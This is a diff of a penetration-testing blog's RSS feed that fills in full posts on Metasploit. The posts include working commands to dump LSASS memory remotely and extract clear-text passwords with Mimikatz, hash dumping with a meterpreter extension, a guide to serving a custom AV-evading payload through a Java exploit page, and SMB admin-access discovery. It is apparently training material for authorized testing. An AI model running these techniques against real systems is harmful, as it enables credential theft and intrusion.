@@ -8,7 +8,7 @@
     <language>en-us</language>
     <lastBuildDate>Mon, 13 Jan 2014 14:32:04 -0500</lastBuildDate>
     
-	<atom:link href="https://malicious.link/categories/metasploit/index.xml" rel="self" type="application/rss+xml" />
+        <atom:link href="https://malicious.link/categories/metasploit/index.xml" rel="self" type="application/rss+xml" />
     
     
     <item>
@@ -17,10 +17,16 @@
       <pubDate>Mon, 13 Jan 2014 14:32:04 -0500</pubDate>
       
       <guid>https://malicious.link/post/2014/2014-01-13-installing-metasploit-community-edition-on-windows-8/</guid>
-      <description>  Show URL: Hak5
- Youtube URL: YouTube
- Show RSS feed: RSS
-  </description>
+      <description>&lt;iframe width=&#34;560&#34; height=&#34;315&#34; src=&#34;//www.youtube.com/embed/a3nzWgUgQO8&#34; frameborder=&#34;0&#34; allowfullscreen&gt;&lt;/iframe&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;Show URL: &lt;a href=&#34;http://hak5.org/category/episodes/metasploit-minute&#34;&gt;Hak5&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;Youtube URL: &lt;a href=&#34;http://www.youtube.com/playlist?list=PLW5y1tjAOzI3n4KRN_ic8N8Qv_ss_dh_F&#34;&gt;YouTube&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;Show RSS feed: &lt;a href=&#34;http://gdata.youtube.com/feeds/api/playlists/W5y1tjAOzI3n4KRN_ic8N8Qv_ss_dh_F&#34;&gt;RSS&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;
+&lt;/ul&gt;
+</description>
     </item>
     
     <item>
@@ -29,10 +35,16 @@
       <pubDate>Mon, 06 Jan 2014 14:30:08 -0500</pubDate>
       
       <guid>https://malicious.link/post/2014/2014-01-06-metasploit-minute-mondays-with-mubix/</guid>
-      <description> Show URL: Hak5
- Youtube URL: YouTube
- Show RSS feed: RSS
-   </description>
+      <description>&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;Show URL: &lt;a href=&#34;http://hak5.org/category/episodes/metasploit-minute&#34;&gt;Hak5&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;Youtube URL: &lt;a href=&#34;http://www.youtube.com/playlist?list=PLW5y1tjAOzI3n4KRN_ic8N8Qv_ss_dh_F&#34;&gt;YouTube&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;Show RSS feed: &lt;a href=&#34;http://gdata.youtube.com/feeds/api/playlists/W5y1tjAOzI3n4KRN_ic8N8Qv_ss_dh_F&#34;&gt;RSS&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;iframe width=&#34;560&#34; height=&#34;315&#34; src=&#34;//www.youtube.com/embed/TCPyoWHy4eA&#34; frameborder=&#34;0&#34; allowfullscreen&gt;&lt;/iframe&gt;
+</description>
     </item>
     
     <item>
@@ -41,7 +53,64 @@
       <pubDate>Fri, 07 Jun 2013 15:00:08 +0000</pubDate>
       
       <guid>https://malicious.link/post/2013/2013-06-07-using-mimikatz-alpha-or-getting-clear-text-passwords-with-a/</guid>
-      <description>Mimikatz is now built into Metasploit&amp;rsquo;s meterpreter, you can do load mimikatz from the meterpreter prompt, but if you don&amp;rsquo;t want to go through the hassle of dealing with AV, reverse or bind payloads, meterpreter binaries, and you have clear text credentials for an admin, you can just use Mimikatz&amp;rsquo;s alpha release that allows you to run Mimikatz on your machine against a process memory dump of LSASS. The great thing about this technique is that the only thing on disk is a Microsoft tool.</description>
+      <description>&lt;p&gt;Mimikatz is now &lt;a href=&#34;https://github.com/rapid7/meterpreter/pull/9&#34;&gt;built into Metasploit&amp;rsquo;s meterpreter&lt;/a&gt;, you can do load mimikatz from the meterpreter prompt, but if you don&amp;rsquo;t want to go through the hassle of dealing with AV, reverse or bind payloads, meterpreter binaries, and you have clear text credentials for an admin, you can just use Mimikatz&amp;rsquo;s alpha release that allows you to run Mimikatz on your machine against a process memory dump of LSASS. The great thing about this technique is that the only thing on disk is a Microsoft tool.&lt;/p&gt;
+
+&lt;p&gt;Mimikatz Minidump: &lt;a href=&#34;http://blog.gentilkiwi.com/securite/mimikatz/minidump&#34;&gt;http://blog.gentilkiwi.com/securite/mimikatz/minidump&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Procdump: &lt;a href=&#34;http://technet.microsoft.com/en-us/sysinternals/dd996900.aspx&#34;&gt;http://technet.microsoft.com/en-us/sysinternals/dd996900.aspx&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Lets start. First we make sure our authentication works against the box and we can look inside of C$ (usually only admins can)&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;net use \\TARGETBOXC$ /user:DOMAIN\serviceaccount serviceaccount123
+dir \\TARGETBOX\C$
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;If that works then we want to check that we can all the &amp;ldquo;AT&amp;rdquo; command on the remote host:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;at \\TARGETBOX
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;All set. Next lets prep our workspace on the remote host. We are using the C:\Temp directory.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;mkdir \\TARGETBOX\C$\Temp
+dir \\TARGETBOX\C$\Temp
+copy c:\temp\procdump.exe \\TARGETBOXC$
+copy c:\temp\procdump.bat \\TARGETBOXC$
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The contents of procdump.bat are:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;@echo off
+C:\temp\procdump.exe -accepteula -ma lsass.exe %COMPUTERNAME%_lsass.dmp
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I&amp;rsquo;m using the computer name in the memory dump name to help me keep track of where the dump came from, but also help me notice when I&amp;rsquo;ve dumped more than one IP that is actually the same host.&lt;/p&gt;
+
+&lt;p&gt;Next we schedule the task. Use net time to determine the local time for the remote machine.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;net time \\TARGETBOX
+at \\TARGETBOX 13:52 C:\Temp\procdump.bat
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Pull down the file and clean up:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;dir \\TARGETBOX\C$\Temp
+copy \\TARGETBOX\C$\Temp\*lsass.dmp C:\temp\output\
+rmdir /s \\TARGETBOX\C$\Temp
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;On your side the only thing you need to make sure is that you are running Mimikatz on a similar version and architecture you pulled from. Use the following url for reference:&lt;a href=&#34;http://blog.gentilkiwi.com/wp-content/uploads/2013/04/minidump_matrix.png&#34;&gt;http://blog.gentilkiwi.com/wp-content/uploads/2013/04/minidump_matrix.png&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Load up the Alpha version of Mimikatz, switch it to minidump mode and you&amp;rsquo;re dumping creds:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;mimikatz # sekurlsa::minidump SUPERCOMPUTER_lsass.dmp
+Switch to MINIDUMP
+
+mimikatz # sekurlsa::logonPasswords full
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Thats it. Password dumping without ever using a &amp;ldquo;Hacker&amp;rdquo; tool on target. Much love Microsoft. And even more to Mimikatz creator &lt;a href=&#34;http://twitter.com/gentilkiwi&#34;&gt;@gentilkiwi&lt;/a&gt; - Benjamin Delpy for both this alpha release and changing his licensing to allow Mimikatz code to be integrated into Meterpreter.&lt;/p&gt;
+</description>
     </item>
     
     <item>
@@ -50,8 +119,66 @@
       <pubDate>Mon, 08 Apr 2013 09:58:20 +0000</pubDate>
       
       <guid>https://malicious.link/post/2013/2013-04-08-sessiondump-meterpreter-extension/</guid>
-      <description>Mimikatz is awesome right, so is WCE. But both have one fatal flaw, even though you can execute them in memory {link} - you still have to have the binaries, remember the command to execute it in memory, and ultimately transfer the entire binary over so that metasploit can do its thing.
-Then along came SessionDump. I only noticed this because someone was tweeting congratulations to someone on writing it:</description>
+      <description>&lt;p&gt;Mimikatz is awesome right, so is WCE. But both have one fatal flaw, even though you can execute them in memory &lt;a href=&#34;https://malicious.link/blog/2012/9/6/completely-in-memory-mimikatz-with-metasploit.html&#34;&gt;{link}&lt;/a&gt; - you still have to have the binaries, remember the command to execute it in memory, and ultimately transfer the entire binary over so that metasploit can do its thing.&lt;/p&gt;
+
+&lt;p&gt;Then along came SessionDump. I only noticed this because someone was tweeting congratulations to someone on writing it:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201304_sessiondump_1.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;No blog post or huge Vegas lights talk on it at DefCon or Blackhat. Just posted online in a corner of the Internet:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201304_sessiondump_2.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&#34;http://www.hsc.fr/ressources/outils/sessiondump/&#34;&gt;http://www.hsc.fr/ressources/outils/sessiondump/&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Before we get started lets be clear about one thing. Sessiondump while awesome doesn&amp;rsquo;t do everything that Mimikatz does. However, it does do the feature of mimikatz that I do use the most, the logged on user hash dumping as well as the wdigest clear text password dumping. It does this as a Meterpreter extension that operates using reflective DLL injection. Does that solve our minor issues we had with mimikatz, as of right now, only partially. This code was simply posted online, not in a pull request or submitted to Metasploit in any way. So you still have to have the binary + code. What about the remembering, surely it makes it so I can just tab complete my way to passwords right? Yup, it does, but until/if it is in the Metasploit trunk you will still have to remember how to get it installed (which we will go over in a bit). The final question is yes it does still transfer a complete DLL over to the host same as any of the other extensions (not to disk mind you, just memory),.&lt;/p&gt;
+
+&lt;p&gt;Without further ado lets go ahead and get the file and do a bunch of extracting. &lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201304_sessiondump_3.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201304_sessiondump_4.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;And finally placing everything in it&amp;rsquo;s correct place, which was nice of the author to make easy by making the archive the same as the Metasploit directory structure:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201304_sessiondump_5.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Cool, everything should be good to go. Lets use this thing. I&amp;rsquo;m using psexec to get a shell but any way you get a windows native meterpreter fine, with one caveat, and its the same as with any of the other aforementioned tools. You need to be Admin (past UAC, w/ SeDebug privilege) or NT\AUTHORITY SYSTEM.  After that it&amp;rsquo;s cake, load the extension:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201304_sessiondump_6.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Here is the available commands:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201304_sessiondump_7.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;And run getHashes:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201304_sessiondump_8.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;or getwDigestPasswords:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201304_sessiondump_9.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Thats is, you free passwords, YAY&amp;hellip;&lt;/p&gt;
+
+&lt;p&gt;Possible issues you may run into:&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;If you are on a x64 box and meterpreter isn&amp;rsquo;t running in a x64 process it will fail saying that it doesn&amp;rsquo;t have the correct version offsets, here is how you can check:&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201304_sessiondump_10.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;x64 system and Meterpreter is x86/win32. Lets find a good process to migrate into and kick it from there. Winlogon isn&amp;rsquo;t the greatest choices since if meterpreter decides to crash it during migration then the system will go down, whereas a service running as SYSTEM will probably just restart if something fails.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201304_sessiondump_11.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;If by any chance you are running it against a system the author hasn&amp;rsquo;t gotten the offsets for. I don&amp;rsquo;t&amp;rsquo; have a screenshot for this one because he covers all the languages I have CMs for, but the author was awesome enough to include a few python scripts that can help you generate the correct offsets. I&amp;rsquo;ll show you by running it on my lsass and widgets.dll files even though he already has this data included in the CSV file that comes with session dump.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Thats all for now folks, may the shells be with you.&lt;/p&gt;
+</description>
     </item>
     
     <item>
@@ -60,9 +187,16 @@ Then along came SessionDump. I only noticed this because someone was tweeting co
       <pubDate>Tue, 19 Mar 2013 14:38:36 +0000</pubDate>
       
       <guid>https://malicious.link/post/2013/2013-03-19-metasploit-mastery-blackhatevents-usa-2013/</guid>
-      <description>Just a quick post to say that egypt and I will be giving Metasploit Mastery twice (2 x 2 day sessions) at BlackHat USA 2013. Come out and get your Metasploit on in Vegas w/ us
-Linky: http://www.blackhat.com/us-13/training/metasploit-mastery.html
-Current fill rate of July 27-28 session: Current fill rate of July 29-30 session: EOM</description>
+      <description>&lt;p&gt;Just a quick post to say that &lt;a href=&#34;https://twitter.com/egyp7&#34;&gt;egypt&lt;/a&gt; and I will be giving Metasploit Mastery twice (2 x 2 day sessions) at BlackHat USA 2013. Come out and get your Metasploit on in Vegas w/ us&lt;/p&gt;
+
+&lt;p&gt;Linky: &lt;a href=&#34;http://www.blackhat.com/us-13/training/metasploit-mastery.html&#34;&gt;http://www.blackhat.com/us-13/training/metasploit-mastery.html&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Current fill rate of July 27-28 session: &lt;img src=&#34;http://www.blackhat.com/images/us-13/trainbars/July2728MetasploitMastery.jpg&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Current fill rate of July 29-30 session: &lt;img src=&#34;http://www.blackhat.com/images/us-13/trainbars/July2930MetasploitMastery.jpg&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;EOM&lt;/p&gt;
+</description>
     </item>
     
     <item>
@@ -71,7 +205,14 @@ Current fill rate of July 27-28 session: Current fill rate of July 29-30 session
       <pubDate>Fri, 25 Jan 2013 16:12:20 +0000</pubDate>
       
       <guid>https://malicious.link/post/2013/2013-01-25-metasploit-mastery-meets-cansecwest/</guid>
-      <description>In 2012 @egypt and I taught Metasploit Mastery for a day and a half @DerbyCon . This was a lot of fun but we had to cram a TON of slides into that short period of time. PLUS we had a CTF at the end where people had to break into a corporate network (virtualized) and sell their shells, data, passwords, or flags to us (egypt and I were acting as opposing countries).</description>
+      <description>&lt;p&gt;In 2012 @&lt;a href=&#34;https://twitter.com/egyp7&#34;&gt;egypt&lt;/a&gt; and I taught &lt;a href=&#34;https://www.derbycon.com/traning-classes-2012/#metasploit&#34;&gt;Metasploit Mastery&lt;/a&gt; for a day and a half @&lt;a href=&#34;https://twitter.com/derbycon&#34;&gt;DerbyCon&lt;/a&gt; . This was a lot of fun but we had to cram a TON of slides into that short period of time. PLUS we had a CTF at the end where people had to break into a corporate network (virtualized) and sell their shells, data, passwords, or flags to us (egypt and I were acting as opposing countries). You could sell low to one and high to another whatever. Most money at the end wins. (We used a score card with ranges to keep it even)&lt;/p&gt;
+
+&lt;p&gt;We are doubling down on the content being provided and doing a 3 full days @&lt;a href=&#34;https://twitter.com/secwest&#34;&gt;CanSecWest&lt;/a&gt;. You get to learn the nooks and cranies of Metasploit&amp;rsquo;s guts from &lt;em&gt;the&lt;/em&gt; egypt himself, and operational use from me, with a ton mixed in between. I mean, just getting in the room with egypt&amp;rsquo;s beard is worth the price of admission.&lt;/p&gt;
+
+&lt;p&gt;See you there!&lt;/p&gt;
+
+&lt;p&gt;Link: &lt;a href=&#34;http://cansecwest.com/dojos/2013/meta_mastery.html&#34;&gt;http://cansecwest.com/dojos/2013/meta_mastery.html&lt;/a&gt;&lt;/p&gt;
+</description>
     </item>
     
     <item>
@@ -80,8 +221,70 @@ Current fill rate of July 27-28 session: Current fill rate of July 29-30 session
       <pubDate>Mon, 19 Nov 2012 05:59:10 +0000</pubDate>
       
       <guid>https://malicious.link/post/2012/2012-11-19-execustom-in-metasploits-java-exploits/</guid>
-      <description>Let me say first off that this isn&amp;rsquo;t the most elegant of ways to accomplish it. It is in the &amp;ldquo;it works for me&amp;rdquo; stage.
-A quick primer on EXE::Custom: This is a setting just like RHOST in Metasploit wherever an EXE is built for Windows payloads. Such as PSEXEC, BypassUAC, etc. It tells Metasploit to ignore all of your payload settings and just use the EXE you have specified. Now this does come at a bit of a cost.</description>
+      <description>&lt;p&gt;Let me say first off that this isn&amp;rsquo;t the most elegant of ways to accomplish it. It is in the &amp;ldquo;it works for me&amp;rdquo; stage.&lt;/p&gt;
+
+&lt;p&gt;A quick primer on EXE::Custom: This is a setting just like RHOST in Metasploit wherever an EXE is built for Windows payloads. Such as PSEXEC, BypassUAC, etc. It tells Metasploit to ignore all of your payload settings and just use the EXE you have specified. Now this does come at a bit of a cost. If you don&amp;rsquo;t have a handler set up to catch whatever is in your EXE and you have bogus information in your payload settings for your module, Metasploit won&amp;rsquo;t be able to magically determine what you want it to do. So make sure that you either have the payload settings correct (even though it won&amp;rsquo;t use them for the exploit) or set the option &amp;ldquo;DisablePayloadHandler&amp;rdquo; to true and start your own handler somewhere else.&lt;/p&gt;
+
+&lt;p&gt;With that said, the Java Signed Applet attack is one of the most widely used, one problem in the Metasploit module version is that you have no external control (such as EXE::Custom) for the binary that is dropped if you are using a Windows native payload. (I do highly recommend trying out Java Meterpreter, but that it for another post)&lt;/p&gt;
+
+&lt;p&gt;Here is the hack that gets me by until a more elegant solution is thought up by smarter people than I:&lt;/p&gt;
+
+&lt;p&gt;We are going to use the Java Rhino exploit, and this story starts with an undetectable.exe sitting in /tmp/ - How you bypass the AV you are up against is up to you. The first thing we need to do is make a core library change. Yes, this is as scary as it sounds and you should document any time you do so you can revert as needed.&lt;/p&gt;
+
+&lt;p&gt;In your MSF directory open up lib/msf/util/exe.rb - should look something like this:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201211_customejavaexe_1.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Scroll down or search for &lt;code&gt;self.to_jar&lt;/code&gt; - should look something like this:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201211_customejavaexe_2.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Now add &lt;code&gt;exe = File.read(&#39;/path/to/your/evil.exe&#39;)&lt;/code&gt; as demonstrated below:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201211_customejavaexe_3.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Cool. We&amp;rsquo;ve made our change, now we have to pull down a jar generated with our evil bin, and the Rhino exploit. We can do that by spinning up Metasploit with our newly editing core library. Load up the Rhino exploit via &lt;code&gt;use exploit/multi/browser/java_rhino&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201211_customejavaexe_4.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;One trip up that I messed up even just creating this blog post (and a constant headache in the #Metasploit channel on Freenode) is forgetting to set the TARGET variable in Java exploits. The default payload type being Java. Since we are using a native windows binary we need to specify Windows by setting TARGET 1.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201211_customejavaexe_5.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Run the exploit with any settings, since we&amp;rsquo;ll be just pulling out what we need. Then pull down the exploit JAR file with wget:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201211_customejavaexe_6.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;(Most java exploits are set to answer ANY .jar extension request with the payload.)&lt;/p&gt;
+
+&lt;p&gt;The HTML to load the JAR is pretty straight forward, but if you&amp;rsquo;ve never seen it before here it is:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201211_customejavaexe_7.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Thats it. A very blank page with an exploit in it. We can do better than that:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201211_customejavaexe_8.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Obviously you can do whatever you want with the HTML, mirror a site or what have you. Notice that I&amp;rsquo;ve also changed the name of the JAR. (You can&amp;rsquo;t change the class unless you start making changes to the exploit directly and I wanted to keep this as generically applicable as possible)&lt;/p&gt;
+
+&lt;p&gt;Move the Applet.jar to SuperMario.jar and start up a Web server (for demo using Python&amp;rsquo;s awesome SimpleHTTPServer, but apache will serve as well)&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201211_customejavaexe_9.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Don&amp;rsquo;t forget to start up a handler for our now-external exploit:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201211_customejavaexe_10.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Victim views the site:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201211_customejavaexe_11.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;And WA-LA! we haz shell:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201211_customejavaexe_12.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Yay… Game over..&lt;/p&gt;
+</description>
     </item>
     
     <item>
@@ -90,8 +293,74 @@ A quick primer on EXE::Custom: This is a setting just like RHOST in Metasploit w
       <pubDate>Wed, 31 Oct 2012 01:28:22 +0000</pubDate>
       
       <guid>https://malicious.link/post/2012/2012-10-31-finding-admin-access/</guid>
-      <description>You&amp;rsquo;ve got shell, and a set of credentials but you&amp;rsquo;re coming up empty on what you can do with those credentials. This is especially problematic when you can&amp;rsquo;t get past UAC as you are either in a AlwaysNotify situation or not a local admin.
-(I&amp;rsquo;m not trying to pull some some &amp;ldquo;insert magic here&amp;rdquo; on the assumption of credentials just at the time of this writing I have only just started working (created a blank file) on a post module to do this as your current user, so until then, you need credentials)</description>
+      <description>&lt;p&gt;You&amp;rsquo;ve got shell, and a set of credentials but you&amp;rsquo;re coming up empty on what you can do with those credentials. This is especially problematic when you can&amp;rsquo;t get past UAC as you are either in a AlwaysNotify situation or not a local admin.&lt;/p&gt;
+
+&lt;p&gt;(I&amp;rsquo;m not trying to pull some some &amp;ldquo;insert magic here&amp;rdquo; on the assumption of credentials just at the time of this writing I have only just started working (created a blank file) on a post module to do this as your current user, so until then, you need credentials)&lt;/p&gt;
+
+&lt;p&gt;Enter the auxiliary module: &lt;code&gt;auxiliary/admin/smb/check_dir_file&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;First we set up a route as aux modules don&amp;rsquo;t have a &amp;ldquo;SESSION&amp;rdquo; parameter:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_adminaccess_1.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Use the module and set our credentials:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_adminaccess_2.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Next, set ADMIN$ as we can&amp;rsquo;t guarantee C$ is the primary drive, but ADMIN$ will definitely be the WINDOWS directory. Our RHOSTS is our target range&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_adminaccess_3.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;A simple &amp;lsquo;run&amp;rsquo; and away it goes:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_adminaccess_4.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;So we can see that our lowly user that doesn&amp;rsquo;t have any chance of bypassing the UAC on his current system can pivot to these other systems (172.16.10.10, and 172.16.10.150) quite easily.&lt;/p&gt;
+
+&lt;p&gt;=============================================================================&lt;/p&gt;
+
+&lt;p&gt;The rest of this has nothing to do about admin access, just some tricks to do it better&lt;/p&gt;
+
+&lt;p&gt;=============================================================================&lt;/p&gt;
+
+&lt;p&gt;As many of you know I&amp;rsquo;m not a huge fan of sending packets I don&amp;rsquo;t need to so instead of just spraying a range (which I doubt would be seen, but why take the chance?)&lt;/p&gt;
+
+&lt;p&gt;[&lt;strong&gt;Update&lt;/strong&gt;: While computer_browser_discovery does lookup all the hosts and sends -more- packets than check_dir_file would, those extra packets are sent at DNS resolvers not into empty space that can be detected by network sensors]&lt;/p&gt;
+
+&lt;p&gt;Enter computer_browser_discovery:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_adminaccess_5.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;This module does the equivalent of &amp;lsquo;net view&amp;rsquo; to get a list of computers on the domain. You can change the LTYPE to &amp;ldquo;SQL&amp;rdquo; to just get MSSQL boxes but we&amp;rsquo;re going for everything:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_adminaccess_6.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;As you can see WIN7X86 (the box we are on came up with 0.0.0.0) expected. and the .150 address didn&amp;rsquo;t show up at all as it&amp;rsquo;s not on the domain. So the benefits is that it&amp;rsquo;s quieter on the wire and you probably will find hosts that aren&amp;rsquo;t in your immediate IP range. (Not the case here simply because I don&amp;rsquo;t have a big enough test network). The disadvantages are as with the .150 address you may miss hosts.&lt;/p&gt;
+
+&lt;p&gt;Next we add the found host&amp;rsquo;s IP addresses to a text file (targethosts.txt)&lt;/p&gt;
+
+&lt;p&gt;[because at the time of this writing the computer_browser_discovery module doesn&amp;rsquo;t add the hosts to the MSF database]&lt;/p&gt;
+
+&lt;p&gt;Then use the smb_version module which does a couple things, it verifies that the hosts are there and alive, adds them to the MSF database, and what version of Windows (or samba) they are running:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_adminaccess_7.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;(We still have our route set up so this is module is going through our low privilege user still)&lt;/p&gt;
+
+&lt;p&gt;And now we have info in the DB for better targeting:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_adminaccess_8.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Then back in our check_dir_file module we just use the hosts -R to have the database automatically set RHOSTS to the hosts in the database that match your search or alternatively use services -p 445 -R to add all the hosts that you&amp;rsquo;ve found port 445 open (everything smb_version finds will be shown in services)&lt;/p&gt;
+
+&lt;p&gt;One more way you can get hosts is doing reverse lookups of ranges. You can just hit a range you know of, or guess ranges based on the computer_browser_discovery results. You can do this with resolve_ip module (this can be pretty slow on ranges that don&amp;rsquo;t have many hosts):&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_adminaccess_9.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I used the range this blog is hosted on 1) because for some reason my stupid VM wasn&amp;rsquo;t resolving internal stuff 2) To demonstrate that you can use the module to resolve anything, not just internal ranges.&lt;/p&gt;
+
+&lt;p&gt;So to wrap up, we have a ton of ways to find hosts that don&amp;rsquo;t involve traditional scanning (smb_version is the only thing that comes close). And we&amp;rsquo;ve located two hosts that we have the ability to administer. One oddly enough being the domain controller, so don&amp;rsquo;t ever discount the access you already have. Tunnel vision is the pentesters worst enemy.&lt;/p&gt;
+</description>
     </item>
     
     <item>
@@ -100,11 +369,46 @@ A quick primer on EXE::Custom: This is a setting just like RHOST in Metasploit w
       <pubDate>Tue, 30 Oct 2012 20:05:21 +0000</pubDate>
       
       <guid>https://malicious.link/post/2012/2012-10-30-bypassuac-got-a-facelift/</guid>
-      <description>Dave Kennedy and Kevin Mitnick submitted the &amp;ldquo;bypassuac&amp;rdquo; post module to Metasploit a while back (last DerbyCon?). Which is awesome and they did some fantastic work, but I had a few complaints as probably anyone did who used the module on a somewhat modern network.
